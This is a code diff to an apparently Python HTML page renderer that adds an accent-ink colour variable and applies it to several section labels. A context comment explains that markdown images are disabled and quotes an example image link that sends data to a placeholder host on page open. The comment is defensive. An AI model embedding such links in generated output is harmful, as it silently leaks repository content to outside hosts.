@@ -14,7 +14,7 @@ from markdown_it import MarkdownIt
 
 from .llm import extract_mermaid  # noqa: F401  (re-exported for custom renderers)
 from .text import printable  # noqa: F401  (the renderers' callers reach it from here)
-from .theme import DARK_TOKENS, HEAD_ASSETS, TOKENS
+from .theme import DARK_TOKENS, HEAD_ASSETS, TOKENS, flat_ink
 
 # coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
 # live <img> that fires on page open, an egress channel from repo text via
@@ -197,7 +197,7 @@ PAGE = """<!doctype html>
 {head_assets}
 <style>
 {tokens}
-  :root {{ --accent: {accent}; --accent-soft: {accent_soft}; }}
+  :root {{ --accent: {accent}; --accent-soft: {accent_soft}; --accent-ink: {accent_ink}; }}
   body {{ font-family: var(--font); font-size: 13.5px; line-height: 1.5;
     background: var(--bg); color: var(--text); margin: 0; -webkit-font-smoothing: antialiased; }}
   main {{ max-width: 1280px; margin: 0 auto; padding: 0 24px 56px; }}
@@ -207,7 +207,7 @@ PAGE = """<!doctype html>
   .hero-inner {{ max-width: 1120px; margin: 0 auto; }}
   .hero-diagram {{ margin: 18px 0 4px; }}
   .hero-diagram-cap {{ font-size: .7rem; font-weight: 700; letter-spacing: .1em; text-transform: uppercase;
-    color: var(--accent); margin: 0 2px 9px; }}
+    color: var(--accent-ink); margin: 0 2px 9px; }}
   .eyebrow {{ display: inline-flex; align-items: center; gap: 7px; color: {eyebrow_color};
     font-size: .68rem; font-weight: 700; letter-spacing: .18em; text-transform: uppercase; }}
   .eyebrow::before {{ content: ''; width: 16px; height: 2px; background: {eyebrow_bar}; border-radius: 2px; }}
@@ -215,7 +215,7 @@ PAGE = """<!doctype html>
   .hero .sub {{ font-size: .94rem; color: {sub_color}; margin: 0 auto; line-height: 1.6; }}
 
   .sec-head {{ display: flex; align-items: baseline; gap: 10px; margin: 42px 2px 14px; }}
-  .sec-n {{ font-family: 'JetBrains Mono', monospace; font-size: .68rem; font-weight: 700; color: var(--accent); }}
+  .sec-n {{ font-family: 'JetBrains Mono', monospace; font-size: .68rem; font-weight: 700; color: var(--accent-ink); }}
   .sec-label {{ display: flex; align-items: center; gap: 9px; font-size: .68rem; font-weight: 700;
     letter-spacing: .14em; text-transform: uppercase; color: var(--muted); }}
   .sec-label::before {{ content: ''; width: 3px; height: 14px; background: var(--accent); border-radius: 2px; }}
@@ -226,7 +226,7 @@ PAGE = """<!doctype html>
   .intro {{ background: var(--surface); border: 1px solid var(--rule); border-left: 4px solid var(--accent);
     border-radius: var(--radius); box-shadow: var(--shadow); padding: 20px 24px; margin: 30px 0 4px; }}
   .intro-label {{ font-size: .68rem; font-weight: 700; letter-spacing: .14em; text-transform: uppercase;
-    color: var(--accent); margin-bottom: 10px; }}
+    color: var(--accent-ink); margin-bottom: 10px; }}
   .intro p {{ margin: .5em 0; font-size: .96rem; color: var(--body-text); line-height: 1.7; }}
   .intro p:first-child {{ margin-top: 0; }}
   .intro strong {{ color: var(--text); }}
@@ -334,6 +334,7 @@ def _render_card_page(analysis, name, shared):
         title_suffix=theme.title_suffix,
         eyebrow=esc(theme.eyebrow),
         accent=theme.accent, accent_soft=theme.accent_soft,
+        accent_ink=flat_ink(theme.accent),
         hero_from=theme.hero_from, hero_to=theme.hero_to,
         eyebrow_color=theme.eyebrow_color, eyebrow_bar=theme.eyebrow_bar,
         sub_color=theme.sub_color, card_top_from=theme.card_top_from,
